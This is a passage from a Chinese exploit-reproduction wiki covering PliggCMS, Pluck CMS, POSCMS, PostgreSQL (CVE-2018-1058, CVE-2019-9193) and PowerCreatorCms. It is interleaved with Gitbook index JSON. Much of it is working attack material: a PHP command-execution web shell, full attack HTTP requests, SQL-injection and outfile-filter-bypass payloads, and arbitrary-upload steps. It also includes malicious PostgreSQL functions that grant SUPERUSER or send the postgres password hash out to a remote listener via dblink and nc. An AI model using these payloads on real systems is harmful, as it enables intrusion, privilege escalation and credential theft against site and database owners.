PliggCMS2.0.3远程命令执行漏洞/media/rId25.png) 转到/admin/admin_editor.php拦截请求并将路径更改为文件。 例如访问目录中的index.php文件： PliggCMS2.0.3远程命令执行漏洞/media/rId26.png) POST /admin/admin_editor.php HTTP/1.1 Host: www.0-sec.org Content-Length: 33 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://kliqqi Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://www.0-sec.org/admin/admin_editor.php Accept-Encoding: gzip, deflate Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: panelState=CollapseManage%7CCollapseSettings%7CCollapseTemplate; PHPSESSID=lfkc3gtrv5o1golmt5md3; mnm_user=Admin; mnm_key=QWRtaW46MjI0R2dEVTAxZncxZzpl Connection: close the_file=..%2Findex.php&open=Open 只需单击\"在浏览器中显示响应\"，然后编辑文件即可 PliggCMS2.0.3远程命令执行漏洞/media/rId27.png) 例如 ： if($_GET['cmd']){ system($_GET['cmd']); } 最后访问website.fr?cmd=dir PliggCMS2.0.3远程命令执行漏洞/media/rId28.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:01:53 "},"Web安全/Pluck cms/Pluck CMS后台另两处任意代码执行/Pluck CMS后台另两处任意代码执行.html":{"url":"Web安全/Pluck cms/Pluck CMS后台另两处任意代码执行/Pluck CMS后台另两处任意代码执行.html","title":"Pluck CMS后台另两处任意代码执行","keywords":"","body":"Pluck CMS后台另两处任意代码执行 一、漏洞简介 二、漏洞影响 三、复现过程 第一处：过滤不严导致单引号逃逸 在function.php里面blog_save_post()函数 function blog_save_post($title, $category, $content, $current_seoname = null, $force_time = null) { //Check if 'posts' directory exists, if not; create it. if (!is_dir(BLOG_POSTS_DIR)) { mkdir(BLOG_POSTS_DIR); chmod(BLOG_POSTS_DIR, 0777); } //Create seo-filename $seoname = seo_url($title); //Sanitize variables. $title = sanitize($title, true); $content = sanitizePageContent($content, false); if (!empty($current_seoname)) { $current_filename = blog_get_post_filename($current_seoname); $parts = explode('.', $current_filename); $number = $parts[0]; //Get the post time. include BLOG_POSTS_DIR.'/'.$current_filename; if ($seoname != $current_seoname) { unlink(BLOG_POSTS_DIR.'/'.$current_filename); if (is_dir(BLOG_POSTS_DIR.'/'.$current_seoname)) rename(BLOG_POSTS_DIR.'/'.$current_seoname, BLOG_POSTS_DIR.'/'.$seoname); } } else { $files = read_dir_contents(BLOG_POSTS_DIR, 'files'); //Find the number. if ($files) { $number = count($files); $number++; } else $number = 1; if (empty($force_time)) $post_time = time(); else $post_time = $force_time; } //Save information. $data['post_title'] = $title; $data['post_category'] = $category; $data['post_content'] = $content; $data['post_time'] = $post_time; save_file(BLOG_POSTS_DIR.'/'.$number.'.'.$seoname.'.php', $data); //Return seoname under which post has been saved (to allow for redirect). return $seoname; } 其中 $data['post_title'] = $title; $data['post_category'] = $category; $data['post_content'] = $content; $data['post_time'] = $post_time; $title $content 均被过滤，$post_time不可控，$category可控 所以只要把$cont2变成我们的payload即可 第二处：安装模版+文件包含导致任意命令执行 很多CMS都会在安装模版的时候getshell，那么这里笔者也发现了类似的漏洞。 1、直接访问失败 首先准备一个shell.php里面是我们的phpinfo(); 然后打包成shell.zip，直接上传主题 发现确实上传并且解压成功 但是由于目录下有.htaccess文件，直接把php设置为不可解析，所以无法直接访问 2、文件包含突破 所以就想到需要找一个位置对其进行包含，来达到执行的目的。 首先看到admin.php中关于theme的部分 跟进 data/inc/theme.php，发现调用了get_themes()方法 跟进 functions.all.php，查看get_themes()方法 function get_themes() { $dirs = read_dir_contents('data/themes', 'dirs'); if ($dirs) { natcasesort($dirs); foreach ($dirs as $dir) { if (file_exists('data/themes/'.$dir.'/info.php')) { include_once ('data/themes/'.$dir.'/info.php'); $themes[] = array( 'title' => $themename, 'dir' => $dir ); } } return $themes; } else return false; } 发现会遍历data/themes/下所有主题目录，并且包含他的info.php文件 此时info.php可控，就导致了任意代码执行。 3、利用方法 首先准备一个info.php 然后打包压缩成shell.zip 上传安装主题，然后点击回到主题页，此时触发文件包含。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:01:56 "},"Web安全/POSCMS/POSCMS 3.2.0 ssrf漏洞getshell/POSCMS 3.2.0 ssrf漏洞getshell.html":{"url":"Web安全/POSCMS/POSCMS 3.2.0 ssrf漏洞getshell/POSCMS 3.2.0 ssrf漏洞getshell.html","title":"POSCMS 3.2.0 ssrf漏洞getshell","keywords":"","body":"POSCMS 3.2.0 ssrf漏洞getshell 一、漏洞简介 二、漏洞影响 POSCMS 3.2.0 三、复现过程 打开项目源代码，第一个漏洞的出处在\\diy\\module\\member\\controllers\\Api.php中的down_file()函数，内容如下： // 文件下载并上传 public function down_file() { /*********************************************************** * Part0. 获取POST参数url中的内容并解析 ************************************************************/ $p = array(); $url = explode('&', $this->input->post('url')); foreach ($url as $t) { $item = explode('=', $t); $p[$item[0]] = $item[1]; } /*********************************************************** * Part1. 验证用户权限 ************************************************************/ !$this->uid && exit(dr_json(0, fc_lang('游客不允许上传附件'))); // 会员组权限 $member_rule = $this->get_cache('member', 'setting', 'permission', $this->member['mark']); // 是否允许上传附件 !$this->member['adminid'] && !$member_rule['is_upload'] && exit(dr_json(0, fc_lang('您的会员组无权上传附件'))); // 附件总大小判断 if (!$this->member['adminid'] && $member_rule['attachsize']) { $data = $this->db->select_sum('filesize')->where('uid', $this->uid)->get('attachment')->row_array(); $filesize = (int)$data['filesize']; $filesize > $member_rule['attachsize'] * 1024 * 1024 && exit(dr_json(0, fc_lang('附件空间不足！您的附件总空间%s，现有附件%s。', $member_rule['attachsize'].'MB', dr_format_file_size($filesize)))); } /*********************************************************** * Part2. 解密code参数的值获得扩展、路径等信息 ************************************************************/ list($size, $ext, $path) = explode('|', dr_authcode($p['code'], 'DECODE')); /*********************************************************** * Part3. 生成存放路径 ************************************************************/ $path = $path ? SYS_UPLOAD_PATH.'/'.$path.'/' : SYS_UPLOAD_PATH.'/'.date('Ym', SYS_TIME).'/'; !is_dir($path) && dr_mkdirs($path); $furl = $this->input->post('file'); /*********************************************************** * Part4. 访问并获取文件 ************************************************************/ $file = dr_catcher_data($furl); !$file && exit(dr_json(0, '获取远程文件失败')); /*********************************************************** * Part5. 根据扩展名过滤并存储数据 ************************************************************/ $fileext = strtolower(trim(substr(strrchr($furl, '.'), 1, 10))); //扩展名 $exts = (array)explode(',', $ext); !in_array($fileext, $exts) && exit(dr_json(0, '远程文件扩展名（'.$fileext.'）不允许')); $fileext == 'php' && exit(dr_json(0, '远程文件扩展名（'.$fileext.'）不允许')); $filename = substr(md5(time()), 0, 7).rand(100, 999); //文件名 /*********************************************************** * Part6. 向路径写入数据并返回响应结果 ************************************************************/ if (@file_put_contents($path.$filename.'.'.$fileext, $file)) { $info = array( 'file_ext' => '.'.$fileext, 'full_path' => $path.$filename.'.'.$fileext, 'file_size' => filesize($path.$filename.'.'.$fileext)/1024, 'client_name' => '', ); $this->load->model('attachment_model'); $this->attachment_model->siteid = $p['siteid'] ? $p['siteid'] : SITE_ID; $result = $this->attachment_model->upload($this->uid, $info); if (is_array($result)) { list($id) = $result; echo json_encode(array('status'=>1, 'id'=>$id, 'name' => dr_strcut($filename, 10).'.'.$fileext));exit; } else { @unlink($info['full_path']); exit(dr_json(0, $result)); } } else { exit(dr_json(0, '文件移动失败，目录无权限（'.$path.'）')); } } 源码分析 这段代码的主要逻辑是根据请求中参数去请求文件内容，并将它保存在特定目录中，最后以json格式返回保存结果。 Part1没什么好说的，只要管理员不修改默认权限，注册个普通用户就有视频、图片的上传功能。Part2中dr_authcode()是一个加解密函数，位于\\diy\\dayrui\\helpers\\function_helper.php。其具体实现可以不用关心，毕竟源码已经到手，只要找到密钥，就能随意构造加密结果。 Part3中确定了下载文件的名称，这里我们请求的参数中不包含code参数，使$PATH为空，则它会取问号表达式的后半段SYS_UPLOAD_PATH.'/'.date('Ym', SYS_TIME).'/'，最后的上传路径如下：/uploadfile/年月/。 Part4中的dr_catcher_data()函数正是SSRF漏洞的来源，其实现位于\\diy\\dayrui\\helpers\\function_helper.php。无论代码最后选的是fopen模式还是curl模式，开发人员都没有对可解析的协议做限制，也没有校验请求参数$url的范围。 寻找触发点 直接用VSCode的全局搜索功能，寻找down_file()函数的调用位置： 发现它出现在了一个js文件中，于是构造一个XHR的POST请求到服务端，设置file参数的值使其访问/etc/passwd，得到如下响应： 用浏览器打开\"文件存储路径+返回的文件名\"： GetShell 再请求一下/config/system.php，该文件中存储有重要的元数据。 这是因为Part5中的$ext变量虽然为空，但它专门过滤了.php文件，好在利用file://协议的解析特性，可以绕过这一点，比如.php?.或.php#.： 再次用浏览器打开并设置编码格式为UTF-8： 获取到安全密钥后，可以构造特殊payload绕过扩展名检查。这里，总结一下此次GetShell的思路： 构造特殊payload使.html文件允许被上传 在自己控制的服务器上放置.html文件（里面有恶意代码的php代码） 利用SSRF漏洞，使服务器用http协议访问带外数据（OOB），获取到恶意的.html，形成Getshell 为了绕过扩展名检查，我将加密代码拷贝进另一文件并填入密钥，输入选择1|html,|0，运行得到输出为22d7Qrdws88/R/uETpWlvY/PFNTYzvs/QNj5PBa66veNDlECqpM，并构造POST参数file=http://www.0-sec.org/haha.html&url=code=22d7Qrdws88/R/uETpWlvY/PFNTYzvs/QNj5PBa66veNDlECqpM，这里的haha.html里包含了php代码，最终效果如下： 如果这里复现失败了，那大概是在于两点：一、加密函数有时效性，过时需要重新生成；二、CentOS默认安装的Apache无法解析包含php代码的html文件，需要在/etc/httpd/conf.d/php.conf中添加如下： 参考链接 https://xz.aliyun.com/t/4858\\#toc-1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:01 "},"Web安全/POSCMS/POSCMS 3.2.0 前台sql注入漏洞/POSCMS 3.2.0 前台sql注入漏洞.html":{"url":"Web安全/POSCMS/POSCMS 3.2.0 前台sql注入漏洞/POSCMS 3.2.0 前台sql注入漏洞.html","title":"POSCMS 3.2.0 前台sql注入漏洞","keywords":"","body":"POSCMS 3.2.0 前台sql注入漏洞 一、漏洞简介 二、漏洞影响 POSCMS 3.2.0 三、复现过程 查看源码（\\diy\\dayrui\\models\\Attachment_model.php）可以发现注入点： 该函数的调用点位于（\\diy\\module\\member\\controllers\\Account.php）： 对应的功能实际是前台用户中心--->基本管理--->附件管理的搜索功能，随便选择某个类别搜索后会看到这条请求： GET /index.php?s=member&c=account&m=attachment&module=photo&ext= HTTP/1.1 Host: www.0-sec.org 向module参数注入Payload果然出现了报错： 但不知道为什么博客里的Payload这里复现失败了，不过已经知道是报错注入，我用了经典的Payload------\" or updatexml(1,concat(1,0x7e,user()),1);#拼接入参数中，得到了数据库当前用户： GET /index.php?s=member&c=account&m=attachment&module=photo%22%20or%20updatexml(1,concat(1,0x7e,user()),1);%23&ext= HTTP/1.1 Host: www.0-sec.org 参考链接 https://xz.aliyun.com/t/4858\\#toc-5 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:04 "},"Web安全/POSCMS/POSCMS 任意sql语句执行漏洞/POSCMS 任意sql语句执行漏洞.html":{"url":"Web安全/POSCMS/POSCMS 任意sql语句执行漏洞/POSCMS 任意sql语句执行漏洞.html","title":"POSCMS 任意sql语句执行漏洞","keywords":"","body":"POSCMS 任意sql语句执行漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 任意API调用 分析入口文件 index.php --->/diy/init.php ------>/diy/system/core/CodeIgniter.php 程序使用的CodeIgniter（CI）框架，直接去看CI框架。 $RTR =& load_class('Router', 'core', isset($routing) ? $routing : NULL); 初始化Router类，调用_set_routing()方法绑定路由。 if ( ! isset($this->directory)) { $_d = $this->config->item('directory_trigger'); $_d = isset($_GET[$_d]) ? trim($_GET[$_d], \" \\t\\n\\r\\0\\x0B/\") : ''; if ($_d !== '') { $this->uri->filter_uri($_d); $this->set_directory($_d); } } $_c = trim($this->config->item('controller_trigger')); if ( ! empty($_GET[$_c])) { $this->uri->filter_uri($_GET[$_c]); $this->set_class($_GET[$_c]); $_f = trim($this->config->item('function_trigger')); if ( ! empty($_GET[$_f])) { $this->uri->filter_uri($_GET[$_f]); $this->set_method($_GET[$_f]); } $this->uri->rsegments = array( 1 => $this->class, 2 => $this->method ); } else { $this->_set_default_controller(); } config $config['controller_trigger'] = 'c'; $config['function_trigger'] = 'm'; $config['directory_trigger'] = 'd'; 简述这里就是 $this->class = $_GET[‘c’]; $this->method = $_GET[‘m’]; $this->directory = $_GET[‘d’]; 回到CI框架，这里直接通过反射进行了调用。 $e404 = FALSE; $class = ucfirst($RTR->class); $method = $RTR->method; if (empty($class) OR ! file_exists(APPPATH.'controllers/'.$RTR->directory.$class.'.php')) { $e404 = TRUE; } else { require_once(APPPATH.'controllers/'.$RTR->directory.$class.'.php'); if ( ! class_exists($class, FALSE) OR $method[0] === '_' OR method_exists('CI_Controller', $method)) { $e404 = TRUE; } elseif (method_exists($class, '_remap')) { $params = array($method, array_slice($URI->rsegments, 2)); $method = '_remap'; } elseif ( ! method_exists($class, $method)) { $e404 = TRUE; } /** * DO NOT CHANGE THIS, NOTHING ELSE WORKS! * * - method_exists() returns true for non-public methods, which passes the previous elseif * - is_callable() returns false for PHP 4-style constructors, even if there's a __construct() * - method_exists($class, '__construct') won't work because CI_Controller::__construct() is inherited * - People will only complain if this doesn't work, even though it is documented that it shouldn't. * * ReflectionMethod::isConstructor() is the ONLY reliable check, * knowing which method will be executed as a constructor. */ elseif ( ! is_callable(array($class, $method)) && strcasecmp($class, $method) === 0) { $reflection = new ReflectionMethod($class, $method); if ( ! $reflection->isPublic() OR $reflection->isConstructor()) { $e404 = TRUE; } } } APPPATH.'controllers/ = /diy/dayrui/controllers/ 然后我们就可以调用这里的Controller，关键点是在这里有个admin文件夹，里面包含了管理员可调用的功能点，而且他继承的基类（SuperClass）并没有检测用户权限。就导致任意调用这里的功能点。 SQL语句执行（增删改查） 既然可以调用管理员才能调用的功能点，问题就太多了，这里就随便讲一个喽。 文件：/diy/dayrui/controllers/admin/Db.php 方法：sql public function sql() { $sql = ''; $count = $id = 0; if (IS_POST) { $id = $this->input->post('id'); $sql = str_replace('{dbprefix}', $this->db->dbprefix, $this->input->post('sql')); if (preg_match('/select(.*)into outfile(.*)/i', $sql)) { $this->admin_msg(fc_lang('存在非法select')); } $sql_data = explode(';SQL_FINECMS_EOL', trim(str_replace(array(PHP_EOL, chr(13), chr(10)), 'SQL_FINECMS_EOL', $sql))); if ($sql_data) { $db = $this->db; foreach($sql_data as $query){ if (!$query) { continue; } $queries = explode('SQL_FINECMS_EOL', trim($query)); $ret = ''; foreach($queries as $query) { $ret.= $query[0] == '#' || $query[0].$query[1] == '--' ? '' : $query; } if (!$ret) { continue; } $db->query($ret); $count++; } if ($count == 1 && stripos($ret, 'select') === 0) { $this->template->assign(array( 'result' => $db->query($ret)->result_array(), )); } } } $this->template->assign(array( 'menu' => $this->get_menu_v3(array( fc_lang('执行SQL') => array('admin/db/sql', 'database') )), 'id' => $id, 'sql' => $sql, 'mcount' => $count, )); $this->template->display('db_sql.html'); } 这里使用正则表达式匹配危险字符into outfile，绕过就太简单了。into/**/outfile。 poc https://www.0-sec.org/index.php?c=db&d=admin&m=sql Post sql=select 1 into/**/outfile 'C:\\phpstudy_pro\\WWW\\www.0-sec.org\\poscms\\11111.txt' Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:05 "},"Web安全/PostgreSQL/（CVE-2018-1058）PostgreSQL 提权漏洞/（CVE-2018-1058）PostgreSQL 提权漏洞.html":{"url":"Web安全/PostgreSQL/（CVE-2018-1058）PostgreSQL 提权漏洞/（CVE-2018-1058）PostgreSQL 提权漏洞.html","title":"（CVE-2018-1058）PostgreSQL 提权漏洞","keywords":"","body":"（CVE-2018-1058）PostgreSQL 提权漏洞 一、漏洞简介 PostgreSQL 是一款关系型数据库。其9.3到10版本中存在一个逻辑错误，导致超级用户在不知情的情况下触发普通用户创建的恶意代码，导致执行一些不可预期的操作。 二、漏洞影响 PostgreSQL 9.3-10 三、复现过程 利用方式 在Postgres的commit记录中，有如下commit: As special exceptions, the following client applications behave as documented regardless of search_path settings and schema privileges: clusterdb createdb createlang createuser dropdb droplang dropuser ecpg (not programs it generates) initdb oid2name pg_archivecleanup pg_basebackup pg_config pg_controldata pg_ctl pg_dump pg_dumpall pg_isready pg_receivewal pg_recvlogical pg_resetwal pg_restore pg_rewind pg_standby pg_test_fsync pg_test_timing pg_upgrade pg_waldump reindexdb vacuumdb vacuumlo. Not included are core client programs that run user-specified SQL commands, namely psql and pgbench. 上面的commit提到了两类的client applications。下文的较为直观的利用方式一是针对第二类client applications（比如psql），然后利用方式二是通过第一类client applications来执行任意代码，相比较下更为隐蔽。 利用方式一 在系统schemapg_catalog中，定义了大量的函数，用pgAdmin3查看: PostgreSQL提权漏洞/media/rId27.png) 以函数abs系列为例，接受一个类型为bigint\\smallint\\intger\\real\\double precision\\numeric的参数，返回其绝对值。倘若我们传送一个非数值类型的参数呢，比如text， evil=> select abs('chybeta'); 由于并没有参数类型为text的abs函数，会直接报错： PostgreSQL提权漏洞/media/rId28.png) 但postgres提供了自定义函数的功能！我们创建如下函数： CREATE FUNCTION public.abs(TEXT) RETURNS TEXT AS $$ SELECT 'you are hacked by ' || $1; $$ LANGUAGE SQL IMMUTABLE; 当我们再次执行同样的查询语句，根据postgres的设计流程，它会先去查找系统schemapg_catalog，但由于参数类型不同没有找到，接着按照search_path中的顺序查找，而我们定义的abs(text)存在于schemapublic中，参数符合，因此pg理所当然地执行了我们定义的函数: PostgreSQL提权漏洞/media/rId29.png) 注意一个点，这个函数是定义在schemapublic中的，也就是说对于进入到这个数据库的任何用户，只要他们调用了abs，且参数为text，都有可能会诱发恶意的代码执行。比如以超级用户postgres执行: PostgreSQL提权漏洞/media/rId30.png) 不过有谁会傻乎乎的去运行一个莫名其妙的abs(text)呢？因此真正的攻击手段是将过程隐藏到看似正常的数据库查询中。这次我们选择schemapg_catalog中的另外一类函数比如lower(text)，upper(text)，它们分别将text类型的参数转成小写和大写，不过系统没有提供接受varchar参数的lower和upper，尽管可以进行类型转换，但对pg而言，最好的选择当然是参数类型恰好符合的恶意自定义函数。 创建一个表，值的类型为varchar： CREATE TABLE public.hahahaha AS SELECT 'CHYBETA'::varchar AS contents; 创建对应的恶意函数: CREATE FUNCTION public.lower(varchar) RETURNS TEXT AS $$ SELECT 'you are hacked by ' || $1; $$ LANGUAGE SQL IMMUTABLE; 对绝大部分用户而言，他们可能看大写的CHYBETA不爽，然后执行了lower函数，但在不知道/清楚类型的情况下，他们执行的是public中的恶意自定义函数。 PostgreSQL提权漏洞/media/rId31.png) 只能打印you are hacked by XXX有毛用！！由于恶意自定义函数可以被超级用户调用到，因此也就有了相应的执行权限，最简单的比如提权。 先来看看权限情况（以超级用户为例），可以看到只有postgres的rolsuper是t，即true: PostgreSQL提权漏洞/media/rId32.png) 在用户chybeta登陆进evil数据库后，他创建了如下upper函数: CREATE FUNCTION public.upper(varchar) RETURNS TEXT AS $$ ALTER ROLE chybeta SUPERUSER; SELECT pg_catalog.upper($1); $$ LANGUAGE SQL VOLATILE; PostgreSQL提权漏洞/media/rId33.png) 注意这里是VOLATILE，具体原因参考 官方文档:xfunc-volatility 另外一张table，小写的chybeta: CREATE TABLE public.hehehehe AS SELECT 'chybeta'::varchar AS contents; 管理员一看，心中不爽：小写小写就知道小写，然后: PostgreSQL提权漏洞/media/rId35.png) 看上去一切正常，大写的大写。回到用户chybeta处，查看一下权限: PostgreSQL提权漏洞/media/rId36.png) 已经成为超级用户。 利用方法有很多，理论上只要能创建恶意函数，管理员调用，就是以管理员身份去执行恶意sql语句/代码。在这种情况中，如commit所说Not included are core client programs that run user-specified SQL commands, namely psql and pgbench.，被攻击用户是知道自己执行的sql语句，只是其中的某个function意义被掉包了。 利用方式二 安装完PostgreSQL后还会有一系列的工具，比如pg_dump、pg_dumpall等等。基于利用方式一，在创建了恶意函数的基础之上，可以通过这些工具来执行恶意函数。这些工具在执行过程中会动态设定search_path，导致public的优先级比pg_catalog高，也就是说即使是在相同类型相同参数相同函数名的情况下，会选择public中的函数。相比第一种而言隐蔽性更强，同时有更高的可触发性。 为利用pg_dump中的sql语句，可以利用log来观察执行过程。在superuser的权限下show log_directory;找到log目录，将目录下postgresql.conf中的约莫455行改为log_statement = all。重启PostgreSQL后，使用pg_dump工具执行备份命令: pg_dump -U postgres -f evil.bak evil 同时观察log输出，查找statement: SET search_path =，最后在某处我发现了一段这样的log:PostgreSQL提权漏洞/media/rId38.png) 可以看到在这段log中，有一处的array_to_string是没有指定schema的。在系统schema中它的定义如下： PostgreSQL提权漏洞/media/rId39.png) 在这里由于已经设定了search_path，为了能直接适配，这里创建的恶意函数的参数个数和类型都必须和pg_catalog中定义的相同，倘若不同则会按顺序匹配到正确的函数。 因为pg_dump在运行过程中开启的是read only transaction，根据官方文档： The transaction access mode determines whether the transaction is read/write or read-only. Read/write is the default. When a transaction is read-only, the following SQL commands are disallowed: INSERT, UPDATE, DELETE, and COPY FROM if the table they would write to is not a temporary table; all CREATE, ALTER, and DROP commands; COMMENT, GRANT, REVOKE, TRUNCATE; and EXPLAIN ANALYZE and EXECUTE if the command they would execute is among those listed. This is a high-level notion of read-only that does not prevent all writes to disk. 是不允许执行下类操作的: INSERT, UPDATE, DELETE, COPY FROM all CREATE, ALTER, and DROP commands COMMENT, GRANT, REVOKE, TRUNCATE; and EXPLAIN ANALYZE and EXECUTE if the command they would execute is among those listed 不过并没有禁止select语句。如果开启了dblink，则可以利用查询来带出数据，比如用dblink_connect。因此我们创建这样的一个恶意函数： CREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT AS $$ select dblink_connect((select 'hostaddr=192.168.248.132 port=12345 user=postgres password=chybeta sslmode=disable dbname='||(SELECT passwd FROM pg_shadow WHERE usename='postgres'))); SELECT pg_catalog.array_to_string($1,$2); $$ LANGUAGE SQL VOLATILE; 远程vps上监听： nc -lvv 12345 当管理员进行数据库备份时： pg_dump -U postgres -f evil.bak evil PostgreSQL提权漏洞/media/rId41.png) 即可得到管理员密码： PostgreSQL提权漏洞/media/rId42.png) 参考链接 https://xz.aliyun.com/t/2109\\#toc-1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:06 "},"Web安全/PostgreSQL/（CVE-2019-9193）PostgreSQL 高权限命令执行漏洞/（CVE-2019-9193）PostgreSQL 高权限命令执行漏洞.html":{"url":"Web安全/PostgreSQL/（CVE-2019-9193）PostgreSQL 高权限命令执行漏洞/（CVE-2019-9193）PostgreSQL 高权限命令执行漏洞.html","title":"（CVE-2019-9193）PostgreSQL 高权限命令执行漏洞","keywords":"","body":"（CVE-2019-9193）PostgreSQL 高权限命令执行漏洞 一、漏洞简介 PostgreSQL 9.3至11.2版本中的导入导出数据命令COPY TO/FROM PROGRAM存在操作系统命令注入漏洞。攻击者可利用该漏洞获取数据库超级用户权限，从而执行任意系统命令。 二、漏洞影响 PostgreSQL 9.3至11.2 三、复现过程 首先连接到postgres中，并执行如下POC： DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec; PostgreSQL高权限命令执行漏洞/media/rId24.png) PostgreSQL高权限命令执行漏洞/media/rId25.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:09 "},"Web安全/PowerCreatorCms/PowerCreatorCms任意上传/PowerCreatorCms任意上传.html":{"url":"Web安全/PowerCreatorCms/PowerCreatorCms任意上传/PowerCreatorCms任意上传.html","title":"PowerCreatorCms任意上传","keywords":"","body":"PowerCreatorCms任意上传 编辑器任意文件上传 根据描述，是编辑器的漏洞，查看源码发现该CMS采用了kindeditor编辑器，该编辑器存在任意文件上传漏洞 因为这个是烂大街的东西，关于对kindeditor编辑器任意文件上传的分析文章网上一搜一大堆，因此这里就略了。另外经过复现发现，只能传txt和html，不能传aspx，很鸡肋。 任意文件上传漏洞 UploadResourcePic.ashx 根据发现的两个shell，很明显shell的命名不是通过kindeditor编辑器上传的，一定是通过其他的方法上传上去的，那么我们来分析一下漏洞到底在哪呢？查找具有上传功能的点，发现了upload目录里全是上传功能文件 再结合第一个webshell路径：第一个shell：http://xxx.xxx.xxx.xxx./resourcePic/MQ==.ASPX 根据这个ResourcePic目录，发现是上传功能目录下UploadResourcePic.ashx这样一个文件上传后保存的位置，对其进行代码审计 using System; using System.Web; public class UploadResourcePic : IHttpHandler { public void ProcessRequest(HttpContext context) { context.Response.ContentType = \"text/plain\"; string rid = context.Request[\"ResourceID\"] ?? string.Empty; if (!string.IsNullOrEmpty(rid)) { if (context.Request.Files.Count > 0) { HttpPostedFile file = context.Request.Files[0]; string Url = PowerCreator.MediaServer.PublicClass.WebUtils.WebRoot + \"./resourcePic/\"; string Path = context.Server.MapPath(Url); if (System.IO.Directory.Exists(Path) == false) { System.IO.Directory.CreateDirectory(Path); } string ext = file.FileName.Substring(file.FileName.LastIndexOf('.')).ToUpper(); if (file.ContentType != \"image/jpeg\") { context.Response.Write(-2); } else { string newFileName = PowerCreator.MediaServer.PublicClass.Base64.Encode(rid) + ext; file.SaveAs(Path + newFileName); context.Response.Write(newFileName); } } else { context.Response.Write(-1); } } else { context.Response.Write(\"参数错误\"); } context.Response.End(); } public bool IsReusable { get { return false; } } } 代码逻辑及漏洞如图所示： 根据上面的分析，其实漏洞的关键点就是上传接口未授权访问可以直接进行上传操作，存在一个Content-Type为image/jpeg的判断，另外需要注意的是传递一个ResourceID变量才能成功进入到上传逻辑。 直接访问，没传递rid变量，回显参数错误，因此上传接口前面没有任何校验，可以直接进行文件上传操作 给rid变量赋个值，也即任意使用get方法或者post方法传递ResourceID变量，但是由于不存在文件上传操作，报文类型不符合multipart/form-data规范，因此返回-1 那么只要本地构造一个上传表单，在上传的时候将Content-Type改成image/jpeg，就可以进行任意文件上传，上传过后文件命会是ResourceID变量的值进行base64编码+上传文件的扩展名 本地构造表单 上传 改一个Content-Type为image/jpeg，即可成功getshell uploadCoursePic.ashx 接下来还有一个webshell，http://xxx.xxx.xxx.xxx/fileManager/UploadFile/CoursePic/485b1b71-8035-44c1-9ceb-637cd68eda19.ASPX using System; using System.Web; public class uploadCoursePic : IHttpHandler { public void ProcessRequest(HttpContext context) { context.Response.ContentType = \"text/plain\"; string delFileName = context.Request[\"fileName\"]; string CourseID = context.Request[\"CourseID\"]; if (!string.IsNullOrEmpty(CourseID)) { if (delFileName == new PowerCreator.MediaServer.Course.Logic.Course().Load(int.Parse(CourseID)).PicPath) delFileName = \"\"; } if (!string.IsNullOrEmpty(delFileName)) { try { System.IO.File.Delete(context.Server.MapPath(delFileName)); } catch (Exception e) { } } if (context.Request.Files.Count > 0) { HttpPostedFile file = context.Request.Files[0]; string Url = PowerCreator.MediaServer.PublicClass.WebUtils.WebRoot + \"/fileManager/UploadFile/CoursePic/\"; string Path = context.Server.MapPath(Url); if (System.IO.Directory.Exists(Path) == false) { System.IO.Directory.CreateDirectory(Path); } string ext = file.FileName.Substring(file.FileName.LastIndexOf('.')).ToUpper(); if (!\".PNG.JPG\".Contains(ext)) { context.Response.Write(-2); } string newFileName = Guid.NewGuid().ToString() + ext; file.SaveAs(Path + newFileName); context.Response.Write(Url + newFileName); } else { context.Response.Write(-1); } } public bool IsReusable { get { return false; } } } 前面一部分代码做了一个文件删除的操作，没什么用，重点在28行开始，分析如下： 漏洞原因在于：如果没有通过扩展名为图片的判断的话，会返回-2，但是返回以后程序并没有退出或跳过文件上传操作，依然进行了文件上传操作。我真是没想明白，开发做了这一步判断的目的是什么。。。。。。。。 那么payload的构造就很简单了，直接对着uploadCoursePic.ashx接口发一个multipart/form-data规范报文，无需任何绕过 返回了一个-2，紧接着跟着了成功上传的webshell的地址，和我们分析的预期一模一样 UploadLogo.ashx 本来分析应该到此为止了的，正好作为一个合格的划水的蓝方，闲着也是闲着，不如把其他上传接口也一并看一遍吧，UploadLogo.ashx，代码如下： using System; using System.Web; public class UploadLogo : IHttpHandler { public void ProcessRequest (HttpContext context) { context.Response.ContentType = \"text/plain\"; if (context.Request.Files.Count > 0) { HttpPostedFile file = context.Request.Files[0]; string Url = PowerCreator.MediaServer.PublicClass.WebUtils.WebRoot + \"/images/logo/\"; string Path = context.Server.MapPath(Url); if (System.IO.Directory.Exists(Path) == false) { System.IO.Directory.CreateDirectory(Path); } string ext = file.FileName.Substring(file.FileName.LastIndexOf('.')).ToUpper(); string newFileName = context.Request[\"fileName\"]; file.SaveAs(Path + newFileName); context.Response.Write(Url + newFileName); } else { context.Response.Write(-1); } context.Response.End(); } public bool IsReusable { get { return false; } } } 文件会传到logo目录，如图 如果不赋值fileName变量会报错，如图 只要在上传的时候通过get或者post给fileName赋值即可，payload如下 uploadActPic.aspx不存在漏洞 其实其他几个文件都不存在任意文件上传漏洞了，这里就不再赘述，但是uploadActPic.aspx这个文件比较特殊，里面全是HTML代码，真正的代码通过父类来引入，在dll中，分析过程如下: 哥斯拉导出bin目录 使用dnspy反编译dll文件，uploadActPic方法在LMS_MediaServer.dll这个文件里，查看逻辑使用白名单校验，不存在任意文件上传 至此，代码审计结束 文章来源 https://xz.aliyun.com/t/8478 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:11 "},"Web安全/Pulse Secure/（CVE-2019-11510）Pulse Secure SSL 